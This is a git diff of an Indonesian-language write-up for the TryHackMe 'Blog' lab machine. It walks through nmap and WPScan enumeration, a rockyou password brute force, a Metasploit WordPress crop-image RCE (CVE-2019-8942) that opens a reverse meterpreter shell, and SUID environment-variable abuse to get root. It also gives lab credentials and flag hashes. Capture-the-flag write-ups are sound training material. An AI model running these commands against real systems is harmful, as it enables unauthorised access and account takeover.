@@ -9,38 +9,48 @@ Dokumentasi proses Penetration Testing untuk mesin Blog di platform TryHackMe. F
 1. Enumerasi (Reconnaissance)
 Langkah pertama adalah melakukan pemindaian terhadap target IP untuk mengetahui layanan yang berjalan.
 Nmap Scan
-bash
+
+```bash
 
 nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
+```
 
 Gunakan kode dengan hati-hati.
 Hasil: Ditemukan port 80 (HTTP) menjalankan Apache dan WordPress.
 WordPress Enumeration (WPScan)
 Melakukan enumerasi user untuk menemukan username yang valid:
-bash
+
+```bash
 
 wpscan --url http://blog.thm --enumerate u
+```
 
 Gunakan kode dengan hati-hati.
 User yang ditemukan: bjoel, kwheel.
+
 2. Exploitation (Gaining Access)
+   
 Brute Force Password
 Menggunakan rockyou.txt untuk mendapatkan password user kwheel:
-bash
+
+```bash
 
 wpscan --url http://blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt
+```
 
 Gunakan kode dengan hati-hati.
 Kredensial ditemukan: kwheel : cutiepie1
 Remote Code Execution (RCE)
 WordPress versi 5.0 rentan terhadap CVE-2019-8942 (Crop-to-Shell). Menggunakan Metasploit untuk mendapatkan shell:
 
+    ```
     use exploit/multi/http/wp_crop_rce
     set RHOSTS <TARGET_IP>
     set USERNAME kwheel
     set PASSWORD cutiepie1
     set LHOST <IP_VPN_TUN0>
     exploit
+    ```
 
 Hasil: Mendapatkan meterpreter session sebagai user www-data.
 3. Privilege Escalation (PrivEsc)
@@ -55,18 +65,22 @@ Gunakan kode dengan hati-hati.
 (Catatan: Anda butuh akses lebih tinggi untuk membacanya).
 Eksploitasi SUID Binary
 Mencari binary dengan bit SUID set:
-bash
+
+```bash
 
 find / -perm -u=s -type f 2>/dev/null
+```
 
 Gunakan kode dengan hati-hati.
 Ditemukan binary kustom: /usr/sbin/checker.
 Trigger Root Shell
 Binary tersebut mengecek variabel environment admin. Dengan memanipulasinya, kita bisa memicu shell root:
-bash
+
+```bash
 
 export admin=1
 /usr/sbin/checker
+```
 
 Gunakan kode dengan hati-hati.
 Hasil: Prompt berubah menjadi # (Root).
@@ -81,7 +95,7 @@ Setelah menjadi root, kita dapat mengambil kedua flag:
 
     Root Flag: cat /root/root.txt
     
-```c8421899aae571f7af486492b71a8ab7```
+```9a0b2b618bef9bfa7ac28c1353d9f318```
     
 <img width="976" height="53" alt="image" src="https://github.com/user-attachments/assets/042177b6-6cfd-4e1e-9cf3-7730e107eedb" />
 
